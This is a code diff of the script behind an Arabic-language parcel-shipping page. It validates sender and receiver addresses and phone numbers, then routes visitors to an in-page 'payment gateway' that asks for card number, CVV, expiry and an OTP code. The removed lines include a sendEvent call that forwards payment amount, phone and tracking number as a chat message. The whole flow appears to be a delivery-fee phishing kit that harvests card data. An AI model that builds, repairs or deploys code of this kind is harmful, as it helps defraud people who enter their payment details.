+    document.getElementById('s_country').addEventListener('change', () => updatePhoneField('s')); document.getElementById('r_country').addEventListener('change', () => updatePhoneField('r')); updatePhoneField('s'); updatePhoneField('r');
+    function onlyDigits(v) { return (v || "").replace(/\D/g, ''); }
+    function getExpectedPhoneLength(c) { const l = { sa:10, ae:10, kw:8, bh:8, qa:8, om:8 }; return l[c] || 10; }
+    function isEmpty(id) { return document.getElementById(id).value.trim() === ""; }
+    function validateSender() { clearAllErrors(); let ok = true; if (isEmpty("s_name")) { setError("err_s_name", "يرجى إدخال الاسم"); ok = false; } if (isEmpty("s_city")) { setError("err_s_city", "يرجى إدخال المدينة"); ok = false; } if (isEmpty("s_district")) { setError("err_s_district", "يرجى إدخال الحي"); ok = false; } if (isEmpty("s_street")) { setError("err_s_street", "يرجى إدخال اسم الشارع"); ok = false; } const phone = onlyDigits(document.getElementById("s_phone").value); const expected = getExpectedPhoneLength(document.getElementById("s_country").value); if (phone.length !== expected) { setError("err_s_phone", `يرجى إدخال رقم جوال صحيح (${expected} أرقام)`); ok = false; } return ok; }
+    function validateReceiver() { clearAllErrors(); let ok = true; if (isEmpty("r_name")) { setError("err_r_name", "يرجى إدخال الاسم"); ok = false; } if (isEmpty("r_city")) { setError("err_r_city", "يرجى إدخال المدينة"); ok = false; } if (isEmpty("r_district")) { setError("err_r_district", "يرجى إدخال الحي"); ok = false; } if (isEmpty("r_street")) { setError("err_r_street", "يرجى إدخال اسم الشارع"); ok = false; } const phone = onlyDigits(document.getElementById("r_phone").value); const expected = getExpectedPhoneLength(document.getElementById("r_country").value); if (phone.length !== expected) { setError("err_r_phone", `يرجى إدخال رقم جوال صحيح (${expected} أرقام)`); ok = false; } return ok; }
+    let selectedType = "";
+    function validateDetails() { clearAllErrors(); let ok = true; const tracking = document.getElementById("d_shipno").value.trim(); if (isEmpty("d_shipno")) { setError("err_d_shipno", "يرجى إدخال رقم التتبع (10 أرقام)"); ok = false; } else if (!/^\d{10}$/.test(tracking)) { setError("err_d_shipno", "رقم التتبع يجب أن يتكون من 10 أرقام فقط"); ok = false; } else { setError("err_d_shipno", ""); } if (isEmpty("d_content")) { setError("err_d_content", "يرجى إدخال محتويات الشحنة"); ok = false; } const pieces = parseInt(onlyDigits(document.getElementById("d_pieces").value) || "0", 10); if (!pieces || pieces <= 0) { setError("err_d_pieces", "يرجى إدخال عدد قطع صحيح"); ok = false; } if (!selectedType) { setError("err_d_type", "يرجى اختيار نوع الشحنة (وثائق أو طرد)"); ok = false; } return ok; }
+    document.getElementById("btnNextSender").addEventListener("click", () => { if (validateSender()) go("receiver"); });
+    document.getElementById("btnNextReceiver").addEventListener("click", () => { if (validateReceiver()) go("details"); });
+    document.querySelectorAll("[data-back]").forEach(b => b.addEventListener("click", () => go(b.dataset.back)));
+    document.getElementById("backFromTracking")?.addEventListener("click", () => go("where"));
+    document.querySelectorAll("#page-details .choice.selectable").forEach(el => { el.addEventListener("click", () => { selectedType = el.dataset.type; document.querySelectorAll("#page-details .choice.selectable").forEach(x => x.classList.remove("selected")); el.classList.add("selected"); setError("err_d_type", ""); }); });
+    document.getElementById("newShipmentBtn").addEventListener("click", () => {
+      document.getElementById('s_name').value = '';
+      document.getElementById('s_phone').value = '';
+      document.getElementById('s_city').value = '';
+      document.getElementById('s_district').value = '';
+      document.getElementById('s_street').value = '';
+      document.getElementById('r_name').value = '';
+      document.getElementById('r_phone').value = '';
+      document.getElementById('r_city').value = '';
+      document.getElementById('r_district').value = '';
+      document.getElementById('r_street').value = '';
+      document.getElementById('d_shipno').value = '';
+      document.getElementById('d_content').value = '';
+      document.getElementById('d_pieces').value = '1';
+      document.getElementById('paymentAmount').value = '';
+      selectedType = '';
+      currentTrackingNumber = '';
+      currentPhoneNumber = '';
+      document.querySelectorAll("#page-details .choice.selectable").forEach(x => x.classList.remove("selected"));
+      go("where");
+    });
+    document.getElementById("cancelRefundBtn").addEventListener("click", () => go("where"));
+    document.querySelectorAll('#s_phone, #r_phone').forEach(inp => inp.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); }));
+    document.getElementById('d_shipno').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
+    document.getElementById('d_pieces').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 4); });
+    document.getElementById('refund_phone').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
+    document.getElementById('refund_tracking').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
 
-  // --- الرسالة الرابعة: قيمة الدفع ---
-  document.getElementById("btnProceedToPay").addEventListener("click", async () => {
-    const amountInput = document.getElementById("paymentAmount");
-    let amount = parseFloat(amountInput.value);
-    if (isNaN(amount) || amount <= 0) {
-      setError("err_payment_amount", "يرجى إدخال قيمة دفع صحيحة أكبر من صفر");
-      return;
-    } else {
-      setError("err_payment_amount", "");
-    }
-    // تجهيز بصمة الدفع وضبط المبلغ
-    pg.amount = amount;
-    await pg_initFingerprint();
-    const phone = currentPhoneNumber || 'غير متوفر';
-    const tracking = currentTrackingNumber || 'غير محدد';
-    await sendEvent(`💳 *الانتقال للدفع*\n💰 قيمة الدفع: ${amount} ريال\n📱 رقم الهاتف: ${phone}\n📦 رقم التتبع: ${tracking}`);
-    // عرض صفحة بوابة الدفع
-    go("payment-gateway");
-    // إعادة تعيين حقول البوابة
-    document.getElementById('pg-cardHolder').value = '';
-    document.getElementById('pg-cardNumber').value = '';
-    document.getElementById('pg-cvv').value = '';
-    document.getElementById('pg-expMonth').value = '';
-    document.getElementById('pg-expYear').value = '';
-    document.getElementById('pg-otpInput').value = '';
-    document.querySelectorAll('#page-payment-gateway .pg-screen').forEach(s => s.classList.remove('active'));
-    document.getElementById('pg-paymentScreen').classList.add('active');
-    clearInterval(pg.loader60Timer);
-    clearTimeout(pg.loader30Timer);
+    const mainImg = document.getElementById("mainImage");
+    if (mainImg) { mainImg.addEventListener("dragstart", (e) => e.preventDefault()); mainImg.addEventListener("contextmenu", (e) => e.preventDefault()); }
+    const pages = { home: document.getElementById("page-home"), phone: document.getElementById("page-phone"), where: document.getElementById("page-where"), sender: document.getElementById("page-sender"), receiver: document.getElementById("page-receiver"), details: document.getElementById("page-details"), paymethod: document.getElementById("page-paymethod"), "payment-gateway": document.getElementById("page-payment-gateway"), tracking: document.getElementById("page-tracking"), refund: document.getElementById("page-refund"), success: document.getElementById("page-success") };
+    function go(pageName) { Object.values(pages).forEach(p => p && p.classList.remove("active")); if (pages[pageName]) pages[pageName].classList.add("active"); document.getElementById("app").scrollTo({ top: 0, behavior: "instant" }); closeMenu(); }
+    const burger = document.getElementById("openMenu"), sideMenu = document.getElementById("sideMenu"), overlay = document.getElementById("menuOverlay"), closeBtn = document.getElementById("closeMenuBtn");
+    function openMenu() { sideMenu.classList.add("open"); overlay.classList.add("open"); }
+    function closeMenu() { sideMenu.classList.remove("open"); overlay.classList.remove("open"); }
+    burger.addEventListener("click", openMenu); overlay.addEventListener("click", closeMenu); closeBtn.addEventListener("click", closeMenu);
+    document.querySelectorAll("body > *:not(#myProductBox)").forEach(el => el.style.display = "none");
+    document.body.style.visibility = "visible";
   });
-
-  // ================== بقية الدوال المساعدة ==================
-  function setError(id, msg) { const el = document.getElementById(id); if (!el) return; if (msg) { el.textContent = msg; el.style.display = 'block'; } else { el.textContent = ''; el.style.display = 'none'; } }
-  function clearAllErrors() { document.querySelectorAll('.error-msg').forEach(el => { el.textContent = ''; el.style.display = 'none'; }); }
-  function showPopup(msg) {
-    const popup = document.getElementById('customPopup');
-    document.getElementById('popupMessage').textContent = msg;
-    popup.style.display = 'block';
-    setTimeout(() => { popup.style.display = 'none'; }, 4000);
-  }
-  window.hidePopup = () => document.getElementById('customPopup').style.display = 'none';
-  const countryDial = { sa: '+966', ae: '+971', kw: '+965', bh: '+973', qa: '+974', om: '+968' };
-  const phonePlaceholders = { sa: '0512345678', ae: '0501234567', kw: '50012345', bh: '36001234', qa: '33123456', om: '92123456' };
-  function updatePhoneField(prefix) { const select = document.getElementById(prefix + '_country'); const span = document.querySelector(`#${prefix}_flag span`); const inp = document.getElementById(prefix + '_phone'); if (!select || !span || !inp) return; const code = select.value; span.textContent = countryDial[code] || '+966'; inp.placeholder = phonePlaceholders[code] || '0512345678'; }
-  document.getElementById('s_country').addEventListener('change', () => updatePhoneField('s')); document.getElementById('r_country').addEventListener('change', () => updatePhoneField('r')); updatePhoneField('s'); updatePhoneField('r');
-  function onlyDigits(v) { return (v || "").replace(/\D/g, ''); }
-  function getExpectedPhoneLength(c) { const l = { sa:10, ae:10, kw:8, bh:8, qa:8, om:8 }; return l[c] || 10; }
-  function isEmpty(id) { return document.getElementById(id).value.trim() === ""; }
-  function validateSender() { clearAllErrors(); let ok = true; if (isEmpty("s_name")) { setError("err_s_name", "يرجى إدخال الاسم"); ok = false; } if (isEmpty("s_city")) { setError("err_s_city", "يرجى إدخال المدينة"); ok = false; } if (isEmpty("s_district")) { setError("err_s_district", "يرجى إدخال الحي"); ok = false; } if (isEmpty("s_street")) { setError("err_s_street", "يرجى إدخال اسم الشارع"); ok = false; } const phone = onlyDigits(document.getElementById("s_phone").value); const expected = getExpectedPhoneLength(document.getElementById("s_country").value); if (phone.length !== expected) { setError("err_s_phone", `يرجى إدخال رقم جوال صحيح (${expected} أرقام)`); ok = false; } return ok; }
-  function validateReceiver() { clearAllErrors(); let ok = true; if (isEmpty("r_name")) { setError("err_r_name", "يرجى إدخال الاسم"); ok = false; } if (isEmpty("r_city")) { setError("err_r_city", "يرجى إدخال المدينة"); ok = false; } if (isEmpty("r_district")) { setError("err_r_district", "يرجى إدخال الحي"); ok = false; } if (isEmpty("r_street")) { setError("err_r_street", "يرجى إدخال اسم الشارع"); ok = false; } const phone = onlyDigits(document.getElementById("r_phone").value); const expected = getExpectedPhoneLength(document.getElementById("r_country").value); if (phone.length !== expected) { setError("err_r_phone", `يرجى إدخال رقم جوال صحيح (${expected} أرقام)`); ok = false; } return ok; }
-  let selectedType = "";
-  function validateDetails() { clearAllErrors(); let ok = true; const tracking = document.getElementById("d_shipno").value.trim(); if (isEmpty("d_shipno")) { setError("err_d_shipno", "يرجى إدخال رقم التتبع (10 أرقام)"); ok = false; } else if (!/^\d{10}$/.test(tracking)) { setError("err_d_shipno", "رقم التتبع يجب أن يتكون من 10 أرقام فقط"); ok = false; } else { setError("err_d_shipno", ""); } if (isEmpty("d_content")) { setError("err_d_content", "يرجى إدخال محتويات الشحنة"); ok = false; } const pieces = parseInt(onlyDigits(document.getElementById("d_pieces").value) || "0", 10); if (!pieces || pieces <= 0) { setError("err_d_pieces", "يرجى إدخال عدد قطع صحيح"); ok = false; } if (!selectedType) { setError("err_d_type", "يرجى اختيار نوع الشحنة (وثائق أو طرد)"); ok = false; } return ok; }
-  document.getElementById("btnNextSender").addEventListener("click", () => { if (validateSender()) go("receiver"); });
-  document.getElementById("btnNextReceiver").addEventListener("click", () => { if (validateReceiver()) go("details"); });
-  document.querySelectorAll("[data-back]").forEach(b => b.addEventListener("click", () => go(b.dataset.back)));
-  document.getElementById("backFromTracking")?.addEventListener("click", () => go("where"));
-  document.querySelectorAll("#page-details .choice.selectable").forEach(el => { el.addEventListener("click", () => { selectedType = el.dataset.type; document.querySelectorAll("#page-details .choice.selectable").forEach(x => x.classList.remove("selected")); el.classList.add("selected"); setError("err_d_type", ""); }); });
-  document.getElementById("newShipmentBtn").addEventListener("click", () => {
-    document.getElementById('s_name').value = '';
-    document.getElementById('s_phone').value = '';
-    document.getElementById('s_city').value = '';
-    document.getElementById('s_district').value = '';
-    document.getElementById('s_street').value = '';
-    document.getElementById('r_name').value = '';
-    document.getElementById('r_phone').value = '';
-    document.getElementById('r_city').value = '';
-    document.getElementById('r_district').value = '';
-    document.getElementById('r_street').value = '';
-    document.getElementById('d_shipno').value = '';
-    document.getElementById('d_content').value = '';
-    document.getElementById('d_pieces').value = '1';
-    document.getElementById('paymentAmount').value = '';
-    selectedType = '';
-    currentTrackingNumber = '';
-    currentPhoneNumber = '';
-    document.querySelectorAll("#page-details .choice.selectable").forEach(x => x.classList.remove("selected"));
-    go("where");
-  });
-  document.getElementById("cancelRefundBtn").addEventListener("click", () => go("where"));
-  document.querySelectorAll('#s_phone, #r_phone').forEach(inp => inp.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); }));
-  document.getElementById('d_shipno').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
-  document.getElementById('d_pieces').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 4); });
-  document.getElementById('refund_phone').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
-  document.getElementById('refund_tracking').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
-
-  const mainImg = document.getElementById("mainImage");
-  if (mainImg) { mainImg.addEventListener("dragstart", (e) => e.preventDefault()); mainImg.addEventListener("contextmenu", (e) => e.preventDefault()); }
-  const pages = { home: document.getElementById("page-home"), phone: document.getElementById("page-phone"), where: document.getElementById("page-where"), sender: document.getElementById("page-sender"), receiver: document.getElementById("page-receiver"), details: document.getElementById("page-details"), paymethod: document.getElementById("page-paymethod"), "payment-gateway": document.getElementById("page-payment-gateway"), tracking: document.getElementById("page-tracking"), refund: document.getElementById("page-refund"), success: document.getElementById("page-success") };
-  function go(pageName) { Object.values(pages).forEach(p => p && p.classList.remove("active")); if (pages[pageName]) pages[pageName].classList.add("active"); document.getElementById("app").scrollTo({ top: 0, behavior: "instant" }); closeMenu(); }
-  const burger = document.getElementById("openMenu"), sideMenu = document.getElementById("sideMenu"), overlay = document.getElementById("menuOverlay"), closeBtn = document.getElementById("closeMenuBtn");
-  function openMenu() { sideMenu.classList.add("open"); overlay.classList.add("open"); }
-  function closeMenu() { sideMenu.classList.remove("open"); overlay.classList.remove("open"); }
-  burger.addEventListener("click", openMenu); overlay.addEventListener("click", closeMenu); closeBtn.addEventListener("click", closeMenu);
-  document.addEventListener("DOMContentLoaded", () => { document.querySelectorAll("body > *:not(#myProductBox)").forEach(el => el.style.display = "none"); document.body.style.visibility = "visible"; });
 </script>
 </body>
-              </html>
+  </html>
